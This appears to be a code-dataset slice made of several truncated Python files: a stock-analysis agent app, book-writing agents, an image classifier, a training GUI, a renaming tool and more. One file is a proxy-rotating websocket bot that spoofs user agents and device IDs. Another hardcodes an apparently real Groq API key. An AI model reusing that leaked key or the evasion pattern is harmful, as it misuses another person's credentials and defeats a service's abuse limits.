st.session_state.finance_agent = Agent(\r\n                name=\"Financial AI Agent\",\r\n                role=\"Providing financial insights\",\r\n                model=Groq(api_key=GROQ_API_KEY),\r\n                tools=[YFinanceTools()]\r\n            )\r\n            st.session_state.multi_ai_agent = Agent(\r\n                name='Stock Market Agent',\r\n                role='Stock market analysis specialist',\r\n                model=Groq(api_key=GROQ_API_KEY),\r\n                team=[st.session_state.web_agent, st.session_state.finance_agent]\r\n            )\r\n            st.session_state.agents_initialized = True\r\n            return True\r\n        except Exception as e:\r\n            st.error(f\"Agent initialization error: {str(e)}\")\r\n            return False\r\n\r\ndef get_stock_data(symbol):\r\n    try:\r\n        stock = yf.Ticker(symbol)\r\n        info = stock.info\r\n        hist = stock.history(period=\"1y\")\r\n        return info, hist\r\n    except Exception as e:\r\n        st.error(f\"Error fetching data: {str(e)}\")\r\n        return None, None\r\n\r\ndef create_price_chart(hist_data, symbol):\r\n    fig = go.Figure()\r\n    fig.add_trace(go.Candlestick(\r\n        x=hist_data.index, open=hist_data['Open'],\r\n        high=hist_data['High'], low=hist_data['Low'],\r\n        close=hist_data['Close'], name='OHLC'\r\n    ))\r\n    fig.update_layout(\r\n        title=f'{symbol} Price Movement',\r\n        template='plotly_white',\r\n        xaxis_rangeslider_visible=False,\r\n        height=500\r\n    )\r\n    return fig\r\n\r\ndef main():\r\n    st.title(\"Stocks Analysis AI Agents\")\r\n    \r\n    stock_input = st.text_input(\"Enter Company Name\", help=\"e.g., APPLE, TCS\")\r\n    \r\n    if st.button(\"Analyze\", use_container_width=True):\r\n        if not stock_input:\r\n            st.error(\"Please enter a stock name\")\r\n            return\r\n        \r\n        symbol = COMMON_STOCKS.get(stock_input.upper()) or stock_input\r\n        \r\n        if initialize_agents():\r\n            with st.spinner(\"Analyzing...\"):\r\n                info, hist = get_stock_data(symbol)\r\n                \r\n                if info and hist is not None:\r\n                    col1, col2, col3 = st.columns(3)\r\n                    with col1:\r\n                        st.markdown(f\"<div class='card'><div class='metric-value'>${info.get('currentPrice', 'N/A')}</div><div class='metric-label'>Current Price</div></div>\", unsafe_allow_html=True)\r\n                    with col2:\r\n                        st.markdown(f\"<div class='card'><div class='metric-value'>{info.get('forwardPE', 'N/A')}</div><div class='metric-label'>Forward P/E</div></div>\", unsafe_allow_html=True)\r\n                    with col3:\r\n                        st.markdown(f\"<div class='card'><div class='metric-value'>{info.get('recommendationKey', 'N/A').title()}</div><div class='metric-label'>Recommendation</div></div>\", unsafe_allow_html=True)\r\n                    \r\n                    st.markdown(\"<div class='chart-container'>\", unsafe_allow_html=True)\r\n      ",
    "import aiohttp\nimport asyncio\nimport base64\nimport datetime\nimport json\nimport random\nimport re\nimport ssl\nimport time\nimport uuid\nimport websockets\n\nfrom loguru import logger\nimport pyfiglet\nfrom websockets_proxy import Proxy, proxy_connect\n\nlogger.remove()\nlogger.add(\n    sink=lambda msg: print(msg, end=''),\n    format=(\n        \"<green>{time:DD/MM/YY HH:mm:ss}</green> | \"\n        \"<level>{level:8} | {message}</level>\"\n    ),\n    colorize=True\n)\n\n# main.py\ndef print_header():\n    cn = pyfiglet.figlet_format(\"\u5c0f\u8349\u811a\u672c\")\n    print(cn)\n    print(\"{\u2554\u2550\u2557\u2554\u2550\u2566\u2557\u2500\u2554\u2566\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2557\")\n    print(\"{\u255a\u2557\u255a\u255d\u2554\u2563\u2551\u2500\u2551\u2551\u2554\u2550\u2550\u2563\u2554\u2550\u2557\u2551\u2554\u2550\u2557\u2551\u2554\u2550\u2557\u2551\")\n    print(\"{\u2500\u255a\u2557\u2554\u255d\u2551\u2551\u2500\u2551\u2551\u255a\u2550\u2550\u2563\u2551\u2500\u255a\u2563\u2551\u2500\u2551\u2551\u2551\u2500\u2551\u2551\")\n    print(\"{\u2500\u2554\u255d\u255a\u2557\u2551\u2551\u2500\u2551\u2551\u2554\u2550\u2550\u2563\u2551\u2554\u2550\u2563\u255a\u2550\u255d\u2551\u2551\u2500\u2551\u2551\")\n    print(\"{\u2554\u255d\u2554\u2557\u255a\u2563\u255a\u2550\u255d\u2551\u255a\u2550\u2550\u2563\u255a\u2569\u2550\u2551\u2554\u2550\u2557\u2551\u255a\u2550\u255d\u2551\")\n    print(\"{\u255a\u2550\u255d\u255a\u2550\u2569\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2569\u255d\u2500\u255a\u2569\u2550\u2550\u2550\u255d\")\n    print(\"{\u6211\u7684gihub\uff1agithub.com/Gzgod\")\n    print(\"{\u6211\u7684\u63a8\u7279\uff1a\u63a8\u7279\u96ea\u7cd5\u6218\u795e@Hy78516012\")\n\n# \u521d\u59cb\u5316\u5934\u90e8\u4fe1\u606f\nprint_header()\n\n# \u4f7f\u7528\u7684\u4ee3\u7406\u6570\u91cf /uid\ndef get_proxy_count():\n    while True:\n        try:\n            proxy_count = int(input(\"\u8bf7\u8f93\u5165\u4f60\u8981\u4f7f\u7528\u7684\u4ee3\u7406\u6570\u91cf: \"))\n            if proxy_count > 0:\n                return proxy_count\n            else:\n                print(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5927\u4e8e\u96f6\u7684\u6570\u5b57\u3002\")\n        except ValueError:\n            print(\"\u8bf7\u8f93\u5165\u6709\u6548\u7684\u6570\u5b57\u3002\")\n\nONETIME_PROXY = get_proxy_count()\nDELAY_INTERVAL = 0.5\nMAX_RETRIES = 3\nFILE_UID = \"uid.txt\"\nFILE_PROXY = \"proxy.txt\"\nUSERAGENTS = [\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.57\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.52\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.46\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.128\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.112\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.98\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.83\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.133\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.121\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91\"\n]\nHTTP_STATUS_CODES = {\n    200: \"OK\",\n    201: \"Created\",\n    202: \"Accepted\",\n    204: \"No Content\",\n    400: \"Bad Request\",\n    401: \"Unauthorized\",\n    403: \"Forbidden\",\n    404: \"Not Found\",\n    500: \"Internal Server Error\",\n    502: \"Bad Gateway\",\n    503: \"Service Unavailable\",\n    504: \"Gateway Timeout\"\n}\n\n# \u8bfb\u53d6UID\u548c\u4ee3\u7406\u6570\u91cf\ndef read_uid_and_proxy():\n    with open(FILE_UID, 'r') as file:\n        uid_count = sum(1 for line in file)\n\n    with open(FILE_PROXY, 'r') as file:\n        proxy_count = sum(1 for line in file)\n\n    return uid_count, proxy_count\n\nuid_count, proxy_count = read_uid_and_proxy()\n\nprint()\nprint(f\"UID: {uid_count}. \u6765\u81ea {FILE_UID}\u3002\")\nprint(f\"\u52a0\u8f7d\u4e86 {proxy_count} \u4e2a\u4ee3\u7406\u3002\u6765\u81ea {FILE_PROXY}\u3002\")\nprint(f\"\u6bcf\u4e2a\u4efb\u52a1\u6fc0\u6d3b\u7684\u4ee3\u7406\u6570\u91cf: {ONETIME_PROXY} \u4e2a\u4ee3\u7406\u3002\")\nprint()\n\n# \u83b7\u53d6\u7528\u6237\u8f93\u5165\u4ee5\u5904\u7406\u4ee3\u7406\u5931\u8d25\ndef get_user_input():\n    user_input = \"\"\n    while user_input not in ['yes', 'no']:\n        user_input = input(\"\u9047\u5230\u7279\u5b9a\u5931\u8d25\u65f6\u662f\u5426\u8981\u79fb\u9664\u4ee3\u7406 (yes/no)? \").strip().lower()\n        if user_input not in ['yes', 'no']:\n            print(\"\u65e0\u6548\u8f93\u5165\u3002\u8bf7\u8f93\u5165 'yes' \u6216 'no'\u3002\")\n    return user_input == 'yes'\n\nremove_on_all_errors = get_user_input()\nprint(f\"\u60a8\u9009\u62e9\u4e86: {'\u662f' if remove_on_all_errors else '\u5426'}, \uff01\\n\")\n\n# \u9ed8\u8ba4\u4f7f\u7528 'extension' \u8282\u70b9\u7c7b\u578b\nnode_type = \"extension\"\n\ndef truncate_userid(user_id):\n    return f\"{user_id[:3]}--{user_id[-3:]}\"\n\ndef truncate_proxy(proxy):\n    pattern = r'([a-zA-Z0-9.-]+(?:\\.[a-zA-Z]{2,})|(?:\\d{1,3}\\.){3}\\d{1,3})'\n    match = re.search(pattern, proxy)\n    if match:\n        return match.group(0)\n    return '\u672a\u5b9a\u4e49'\n\ndef count_proxies(FILE_PROXY):\n    try:\n        with open(FILE_PROXY, 'r') as file:\n            proxies = file.readlines()\n        return len(proxies)\n    except FileNotFoundError:\n        logger.error(f\"\u6587\u4ef6 {FILE_PROXY} \u672a\u627e\u5230\uff01\")\n        return 0\n\nasync def connect_to_wss(protocol_proxy, user_id):\n    device_id = str(uuid.uuid3(uuid.NAMESPACE_DNS, protocol_proxy))\n    random_user_agent = random.choice(USERAGENTS)\n    logger.info(f\"UID: {truncate_userid(user_id)} | {node_type} | \u751f\u6210\u8bbe\u5907ID: {device_id} | \u4ee3\u7406: {truncate_proxy(protocol_proxy)}\")\n\n    has_received_action = False\n    is_authenticated = False\n\n    total_proxies = count_proxies(FILE_PROXY)\n\n    while True:\n        try:\n            await asyncio.sleep(random.randint(1, 10) / 10)\n            custom_headers = {\n                \"User-Agent\": random_user_agent,\n    ",
    "\"\"\"Define the agents used in the book generation system with improved context management\"\"\"\nimport autogen\nfrom typing import Dict, List, Optional\n\nclass BookAgents:\n    def __init__(self, agent_config: Dict, outline: Optional[List[Dict]] = None):\n        \"\"\"Initialize agents with book outline context\"\"\"\n        self.agent_config = agent_config\n        self.outline = outline\n        self.world_elements = {}  # Track described locations/elements\n        self.character_developments = {}  # Track character arcs\n        \n    def _format_outline_context(self) -> str:\n        \"\"\"Format the book outline into a readable context\"\"\"\n        if not self.outline:\n            return \"\"\n            \n        context_parts = [\"Complete Book Outline:\"]\n        for chapter in self.outline:\n            context_parts.extend([\n                f\"\\nChapter {chapter['chapter_number']}: {chapter['title']}\",\n                chapter['prompt']\n            ])\n        return \"\\n\".join(context_parts)\n\n    def create_agents(self, initial_prompt, num_chapters) -> Dict:\n        \"\"\"Create and return all agents needed for book generation\"\"\"\n        outline_context = self._format_outline_context()\n        \n        # Memory Keeper: Maintains story continuity and context\n        memory_keeper = autogen.AssistantAgent(\n            name=\"memory_keeper\",\n            system_message=f\"\"\"You are the keeper of the story's continuity and context.\n            Your responsibilities:\n            1. Track and summarize each chapter's key events\n            2. Monitor character development and relationships\n            3. Maintain world-building consistency\n            4. Flag any continuity issues\n            \n            Book Overview:\n            {outline_context}\n            \n            Format your responses as follows:\n            - Start updates with 'MEMORY UPDATE:'\n            - List key events with 'EVENT:'\n            - List character developments with 'CHARACTER:'\n            - List world details with 'WORLD:'\n            - Flag issues with 'CONTINUITY ALERT:'\"\"\",\n            llm_config=self.agent_config,\n        )\n        \n        # Story Planner - Focuses on high-level story structure\n        story_planner = autogen.AssistantAgent(\n            name=\"story_planner\",\n            system_message=f\"\"\"You are an expert story arc planner focused on overall narrative structure.\n\n            Your sole responsibility is creating the high-level story arc.\n            When given an initial story premise:\n            1. Identify major plot points and story beats\n            2. Map character arcs and development\n            3. Note major story transitions\n            4. Plan narrative pacing\n\n            Format your output EXACTLY as:\n            STORY_ARC:\n            - Major Plot Points:\n            [List each major event that drives the story]\n            \n            - Character Arcs:\n            [For each main character, describe their development path]\n            \n            - Story Beats:\n            [List key emotional and narrative moments in sequence]\n            \n            - Key Transitions:\n            [Describe major shifts in story direction or tone]\n            \n            Always provide specific, detailed content - never use placeholders.\"\"\",\n            llm_config=self.agent_config,\n        )\n\n        # Outline Creator - Creates detailed chapter outlines\n        outline_creator = autogen.AssistantAgent(\n            name=\"outline_creator\",\n            system_message=f\"\"\"Generate a detailed {num_chapters}-chapter outline.\n\n            YOU MUST USE EXACTLY THIS FORMAT FOR EACH CHAPTER - NO DEVIATIONS:\n\n            Chapter 1: [Title]\n            Chapter Title: [Same title as above]\n            Key Events:\n            - [Event 1]\n            - [Event 2]\n            - [Event 3]\n            Character Developments: [Specific character moments and changes]\n            Setting: [Specific location and atmosphere]\n            Tone: [Specific emotional and narrative tone]\n\n            [REPEAT THIS EXACT FORMAT FOR ALL {num_chapters} CHAPTERS]\n\n            Requirements:\n            1. EVERY field must be present for EVERY chapter\n            2. EVERY chapter must have AT LEAST 3 specific Key Events\n            3. ALL chapters must be detailed - no placeholders\n            4. Format must match EXACTLY - including all headings and bullet points\n\n            Initial Premise:\n            {initial_prompt}\n\n            START WITH 'OUTLINE:' AND END WITH 'END OF OUTLINE'\n            \"\"\",\n            llm_config=self.agent_config,\n        )\n\n        # World Builder: Creates and maintains the story setting\n        world_builder = autogen.AssistantAgent(\n            name=\"world_builder\",\n            system_message=f\"\"\"You are an expert in world-building who creates rich, consistent settings.\n            \n            Your role is to establish ALL settings and locations needed for the entire story based on a provided story arc.\n\n            Book Overview:\n       ",
    "import argparse\nimport sys\nfrom classifier import classify\nfrom PIL import Image\nimport logging\nimport logger\n\nlogger.setup_logging()\n\n\ndef classify_url(url):\n    import httpx\n    import io\n\n    # Get image from URL\n    response = httpx.get(url, headers={\"User-Agent\": \"Mozilla/5.0\"})\n    img_bytes = response.content\n\n    # Create PIL Image from bytes\n    image = Image.open(io.BytesIO(img_bytes)).convert(\"RGB\")\n    return classify(image)\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Check an image\")\n    parser.add_argument(\"path\", help=\"URL or local file path to check\")\n\n    args = parser.parse_args()\n\n    if not args.path:\n        logging.error(\"Error: Path is required\")\n        sys.exit(1)\n\n    # Check if input is URL or local file\n    if args.path.startswith((\"http://\", \"https://\")):\n        pred, ypred = classify_url(args.path)\n    else:\n        try:\n            image = Image.open(args.path).convert(\"RGB\")\n            pred, ypred = classify(image)\n        except FileNotFoundError:\n            logging.error(f\"Error: File not found: {args.path}\")\n            sys.exit(1)\n        except Exception as e:\n            logging.error(f\"Error loading image: {e}\")\n            sys.exit(1)\n\n    logging.info(f\"{pred} - {ypred[0] * 100:.2f}%\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import os\nfrom pathlib import Path\nfrom typing import Dict, Any\nfrom .config import Config\nfrom .telegram_config import TelegramConfig\nfrom .discord_config import DiscordConfig\n\nclass Settings:\n    \"\"\"Global settings for ONIO AI Agent Framework\"\"\"\n    \n    def __init__(self):\n        self.base_config = Config()\n        self.telegram_config = TelegramConfig()\n        self.discord_config = DiscordConfig()\n        \n        # Load environment variables\n        self._load_env_vars()\n    \n    def _load_env_vars(self):\n        \"\"\"Load configuration from environment variables\"\"\"\n        # Override OpenAI API key if set in environment\n        if os.getenv('OPENAI_API_KEY'):\n            self.base_config.OPENAI_CONFIG['api_key'] = os.getenv('OPENAI_API_KEY')\n            \n        # Override Telegram token if set in environment\n        if os.getenv('TELEGRAM_BOT_TOKEN'):\n            self.telegram_config.BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')\n            \n        # Override Discord token if set in environment\n        if os.getenv('DISCORD_BOT_TOKEN'):\n            self.discord_config.BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')\n    \n    def get_all_config(self) -> Dict[str, Any]:\n        \"\"\"Get complete configuration\"\"\"\n        return {\n            'base': self.base_config.get_config(),\n            'telegram': self.telegram_config.get_config(),\n            'discord': self.discord_config.get_config()\n        }\n    \n    def validate_config(self) -> bool:\n        \"\"\"Validate all configuration settings\"\"\"\n        try:\n            # Check required API keys\n            if not self.base_config.OPENAI_CONFIG['api_key']:\n                raise ValueError(\"OpenAI API key is required\")\n                \n            # Check paths\n            if not self.base_config.LOGS_DIR.exists():\n                self.base_config.LOGS_DIR.mkdir(parents=True)\n                \n            # Add more validation as needed\n            return True\n            \n        except Exception as e:\n            print(f\"Configuration validation failed: {str(e)}\")\n            return False\n\n# Create global settings instance\nsettings = Settings() ",
    "from groq import Groq\r\n\r\ndef aiProsses(command, context=None):\r\n\r\n    client = Groq(api_key= \"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\")\r\n\r\n    # The variable messages is a list of dictionaries.\r\n    messages = [\r\n        {\"role\": \"system\", \"content\": \"You are a virtual assistant named Sagar Biswas, skilled in tasks such as hacking, coding, flirting, and pickup line generating. Your purpose is to create creative pickup lines as human written texts. Generate texts that are tuned like Black-Hat Hackers.\"},\r\n    ]\r\n\r\n    if context is not None:  # Check if context is provided\r\n        messages.append({\"role\": \"system\", \"content\": str(context)})  # Added context to messages\r\n\r\n    \r\n    messages.append({\"role\": \"user\", \"content\": command})\r\n\r\n    completion = client.chat.completions.create(\r\n        model=\"llama3-70b-8192\",\r\n        messages=messages\r\n    )\r\n\r\n    return completion.choices[0].message.content\r\n\r\n\r\ndef prossess_command(command, context=None):\r\n\r\n    command = command.lower()\r\n\r\n    if command.startswith(\"pickup\"):\r\n        try:\r\n            output = aiProsses(command, context)\r\n            print(f\"\\nAI Response: {output}\\n\")\r\n\r\n            if context is None:\r\n                context = []\r\n\r\n            # Ensure context is a list\r\n            if not isinstance(context, list):\r\n                context = []  # Reset context to an empty list if it is not a list\r\n            \r\n            context.append({\"role\": \"user\", \"content\": command})\r\n            context.append({\"role\": \"assistant\", \"content\": output})\r\n\r\n            return context\r\n        \r\n        except Exception as e:\r\n            print(f\"Error: {e}\")\r\n    else: \r\n        output = aiProsses(command, context)\r\n        print(f\"\\nAI Response: {output}\\n\")\r\n\r\n        if context is None:\r\n            context = []\r\n\r\n            # Ensure context is a list\r\n        if not isinstance(context, list):\r\n            context = []  # Reset context to an empty list if it is not a list\r\n            \r\n        context.append({\"role\": \"user\", \"content\": command})\r\n        context.append({\"role\": \"assistant\", \"content\": output})\r\n\r\n        return context\r\n\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    context = None\r\n    print(\"\\nHi, I'm Sagar. The pickup line generator.\\n\")\r\n    \r\n    while True:\r\n        command = input(\"==> \")\r\n        if command.lower() != \"exit\":\r\n            context = prossess_command(command, context)\r\n        else:\r\n            print(\"\\nGoodbye!\\n\")\r\n            break\r\n\r\n\r\n",
    "import gradio as gr\r\nimport subprocess\r\nimport sys\r\nimport os\r\nimport signal\r\nimport psutil\r\nfrom typing import Generator\r\nimport toml  # \u7528\u4e8e\u4fdd\u5b58\u548c\u52a0\u8f7d\u8bbe\u7f6e\r\n\r\n#########################\r\n# 1. \u5168\u5c40\u8fdb\u7a0b\u7ba1\u7406\r\n#########################\r\n\r\nrunning_processes = {\r\n    \"cache\": None,   # \u9884\u7f13\u5b58\u8fdb\u7a0b\r\n    \"train\": None    # \u8bad\u7ec3\u8fdb\u7a0b\r\n}\r\n\r\ndef terminate_process_tree(proc: subprocess.Popen):\r\n    \"\"\"\r\n    \u9012\u5f52\u7ec8\u6b62\u6307\u5b9a\u8fdb\u7a0b\u53ca\u5176\u6240\u6709\u5b50\u8fdb\u7a0b\uff0c\u9002\u7528\u4e8e\u52a0\u901f\u5668\u6216\u591a\u8fdb\u7a0b\u573a\u666f\u3002\r\n    \"\"\"\r\n    if proc is None:\r\n        return\r\n    try:\r\n        parent_pid = proc.pid\r\n        if parent_pid is None:\r\n            return\r\n        parent = psutil.Process(parent_pid)\r\n        # \u5148\u7ec8\u6b62\u6240\u6709\u5b50\u8fdb\u7a0b\r\n        for child in parent.children(recursive=True):\r\n            child.terminate()\r\n        # \u6700\u540e\u7ec8\u6b62\u7236\u8fdb\u7a0b\r\n        parent.terminate()\r\n    except psutil.NoSuchProcess:\r\n        pass\r\n    except Exception as e:\r\n        print(f\"[WARN] terminate_process_tree \u51fa\u73b0\u5f02\u5e38: {e}\")\r\n\r\ndef stop_caching():\r\n    \"\"\"\r\n    \u505c\u6b62\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u9884\u7f13\u5b58\u5b50\u8fdb\u7a0b (cache_latents + cache_text_encoder_outputs).\r\n    \"\"\"\r\n    if running_processes[\"cache\"] is not None:\r\n        proc = running_processes[\"cache\"]\r\n        if proc.poll() is None:\r\n            terminate_process_tree(proc)\r\n            running_processes[\"cache\"] = None\r\n            return \"[INFO] \u5df2\u8bf7\u6c42\u505c\u6b62\u9884\u7f13\u5b58\u8fdb\u7a0b\uff08\u6740\u6389\u6240\u6709\u5b50\u8fdb\u7a0b\uff09\u3002\\n\"\r\n        else:\r\n            return \"[WARN] \u9884\u7f13\u5b58\u8fdb\u7a0b\u5df2\u7ecf\u7ed3\u675f\uff0c\u65e0\u9700\u505c\u6b62\u3002\\n\"\r\n    else:\r\n        return \"[WARN] \u5f53\u524d\u6ca1\u6709\u6b63\u5728\u8fdb\u884c\u7684\u9884\u7f13\u5b58\u8fdb\u7a0b\u3002\\n\"\r\n\r\ndef stop_training():\r\n    \"\"\"\r\n    \u505c\u6b62\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u8bad\u7ec3\u5b50\u8fdb\u7a0b.\r\n    \"\"\"\r\n    if running_processes[\"train\"] is not None:\r\n        proc = running_processes[\"train\"]\r\n        if proc.poll() is None:\r\n            terminate_process_tree(proc)\r\n            running_processes[\"train\"] = None\r\n            return \"[INFO] \u5df2\u8bf7\u6c42\u505c\u6b62\u8bad\u7ec3\u8fdb\u7a0b\uff08\u6740\u6389\u6240\u6709\u5b50\u8fdb\u7a0b\uff09\u3002\\n\"\r\n        else:\r\n            return \"[WARN] \u8bad\u7ec3\u8fdb\u7a0b\u5df2\u7ecf\u7ed3\u675f\uff0c\u65e0\u9700\u505c\u6b62\u3002\\n\"\r\n    else:\r\n        return \"[WARN] \u5f53\u524d\u6ca1\u6709\u6b63\u5728\u8fdb\u884c\u7684\u8bad\u7ec3\u8fdb\u7a0b\u3002\\n\"\r\n\r\n#########################\r\n# 2. \u8bbe\u7f6e\u4fdd\u5b58\u4e0e\u52a0\u8f7d\r\n#########################\r\n\r\nSETTINGS_FILE = \"settings.toml\"\r\n\r\ndef load_settings() -> dict:\r\n    \"\"\"\r\n    \u52a0\u8f7d settings.toml \u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u3002\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de\u7a7a\u5b57\u5178\u3002\r\n    \"\"\"\r\n    if os.path.exists(SETTINGS_FILE):\r\n        try:\r\n            with open(SETTINGS_FILE, \"r\", encoding=\"utf-8\") as f:\r\n                settings = toml.load(f)\r\n                return settings\r\n        except Exception:\r\n            return {}\r\n    else:\r\n        return {}\r\n\r\ndef save_settings(settings: dict):\r\n    \"\"\"\r\n    \u5c06\u8bbe\u7f6e\u4fdd\u5b58\u5230 settings.toml \u6587\u4ef6\u4e2d\u3002\r\n    \"\"\"\r\n    try:\r\n        with open(SETTINGS_FILE, \"w\", encoding=\"utf-8\") as f:\r\n            toml.dump(settings, f)\r\n    except Exception as e:\r\n        print(f\"[WARN] \u4fdd\u5b58 settings.toml \u5931\u8d25: {e}\")\r\n\r\n#########################\r\n# 3. \u5904\u7406\u8f93\u5165\u6570\u636e\u96c6\u914d\u7f6e\u8def\u5f84 (\u652f\u6301\u6587\u672c\u6216\u6587\u4ef6)\r\n#########################\r\n\r\ndef get_dataset_config(file_path: str, text_path: str) -> str:\r\n    \"\"\"\r\n    \u6839\u636e\u7528\u6237\u8f93\u5165\u7684 file_path (str, \u4e0d\u4e0a\u4f20) \u548c text_path (str)\uff0c\r\n    \u8fd4\u56de\u6700\u7ec8\u8981\u4f7f\u7528\u7684 toml \u8def\u5f84\uff1a\r\n    - \u82e5 file_path \u4e0d\u4e3a\u7a7a\uff0c\u4f18\u5148\u4f7f\u7528 file_path\r\n    - \u5426\u5219\u4f7f\u7528 text_path\r\n    - \u5982\u679c\u90fd\u4e3a\u7a7a\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\r\n    \"\"\"\r\n    if file_path and os.path.isfile(file_path):\r\n        return file_path\r\n    elif text_path.strip():\r\n        return text_path.strip()\r\n    else:\r\n        return \"\"\r\n\r\n#########################\r\n# 4. Pre-caching\r\n#########################\r\n\r\ndef run_cache_commands(\r\n    dataset_config_file: str,  # \u4ec5\u83b7\u53d6\u8def\u5f84\r\n    dataset_config_text: str,\r\n    enable_low_memory: bool,\r\n    skip_existing: bool\r\n) -> Generator[str, None, None]:\r\n    \"\"\"\r\n    \u4f7f\u7528 generator \u51fd\u6570 + accumulated \u6587\u672c\uff0c\u5c06\u6240\u6709\u8f93\u51fa\u8ffd\u52a0\u5230\u540c\u4e00\u4e2a\u6587\u672c\u6846\u4e2d\u3002\r\n    \u5728\u63a7\u5236\u53f0\u540c\u6837\u5b9e\u65f6\u6253\u5370\u6bcf\u884c\u3002\r\n    \"\"\"\r\n    # \u786e\u5b9a\u6700\u7ec8\u7684 dataset_config \u8def\u5f84\r\n    dataset_config = get_dataset_config(dataset_config_file, dataset_config_text)\r\n\r\n    python_executable = \"./python_embeded/python.exe\"\r\n\r\n    # \u7b2c\u4e00\u6bb5\u547d\u4ee4\r\n    cache_latents_cmd = [\r\n        python_executable, \"cache_latents.py\",\r\n        \"--dataset_config\", dataset_config,\r\n        \"--vae\", \"./models/ckpts/hunyuan-video-t2v-720p/vae/pytorch_model.pt\",\r\n        \"--vae_chunk_size\", \"32\",\r\n        \"--vae_tiling\"\r\n    ]\r\n    if enable_low_memory:\r\n        cache_latents_cmd.extend([\"--vae_spatial_tile_sample_min_size\", \"128\", \"--batch_size\", \"1\"])\r\n    if skip_existing:\r\n        cache_latents_cmd.append(\"--skip_existing\")\r\n\r\n    # \u7b2c\u4e8c\u6bb5\u547d\u4ee4\r\n    cache_text_encoder_cmd = [\r\n        python_executable, \"cache_text_encoder_outputs.py\",\r\n        \"--dataset_config\", dataset_config,\r\n        \"--text_encoder1\", \"./models/ckpts/text_encoder\",\r\n        \"--text_encoder2\", \"./models/ckpts/text_encoder_2\",\r\n        \"--batch_size\", \"16\"\r\n    ]\r\n    if enable_low_memory:\r\n        cache_text_encoder_cmd.append(\"--fp8_llm\")\r\n\r\n    def run_and_stream_output(cmd):\r\n        accumulated = \"\"\r\n        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)\r\n        running_processes[\"cache\"] = process\r\n\r\n        for line in process.stdout:\r\n            print(line, end=\"\", flush=True)  # \u63a7\u5236\u53f0\u5b9e\u65f6\u8f93\u51fa\r\n            accumulated += line\r\n            yield accumulated\r\n\r\n        return_code = process.wait()\r\n        running_processes[\"cache\"] = None\r\n\r\n        if return_code != 0:\r\n            error_msg = f\"\\n[ERROR] \u547d\u4ee4\u6267\u884c\u5931\u8d25\uff0c\u8fd4\u56de\u7801: {return_code}\\n\"\r\n ",
    "import os\r\nimport argparse\r\nimport sys\r\nfrom datetime import datetime\r\nfrom shlex import join\r\n\r\nLOG_FILE = \"logs.log\"\r\nMAPPING_FILE = \"backup_mapping.txt\"\r\n\r\nEXAMPLES = \"\"\"\r\nEXAMPLES:\r\n\r\nTo rename and enumerate all files:\r\n\r\n    python r3namex.py -l /images -a -p Photo -ns 10\r\n    python r3namex.py --location /images --all --prefix Photo --new-start 10\r\n\r\nTo renumber files with numbering:\r\n\r\n    python r3namex.py -l /my/folder -p Evidence -cs 1 -ce 3 -ns 5  \r\n    python r3namex.py --location /my/folder --prefix Evidence --current-start 1 --current-end 3 --new-start 5  \r\n\r\nTo revert renaming (rollback):\r\n\r\n    python r3namex.py -l /my/folder -p Evidence -r  \r\n    python r3namex.py --location /my/folder --prefix Evidence --rollback  \r\n\r\n\"\"\"\r\n\r\ndef check_write_permissions(directory):\r\n    if not os.access(directory, os.W_OK):\r\n        print(f\"Error: You do not have write permissions in {directory}.\")\r\n        log_action(f\"You do not have write permissions in {directory}.\")\r\n        sys.exit(1)\r\n\r\n\r\ndef log_action(message, command=None):\r\n    with open(LOG_FILE, \"a\") as log:\r\n        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n        cmd_info = f\"Command: {command}\\n\" if command else \"\"\r\n        log.write(f\"{timestamp} - {cmd_info}{message}\\n\")\r\n\r\ndef rename_all_files(directory, prefix, start_number):\r\n    try:\r\n        check_write_permissions(directory)\r\n        \r\n        files = sorted(os.listdir(directory))\r\n        \r\n        if not files:\r\n            print(f\"Warning: The directory '{directory}' is empty.\")\r\n            sys.exit(1)\r\n        \r\n        log_action(\"Command: \" + ' '.join(sys.argv))\r\n    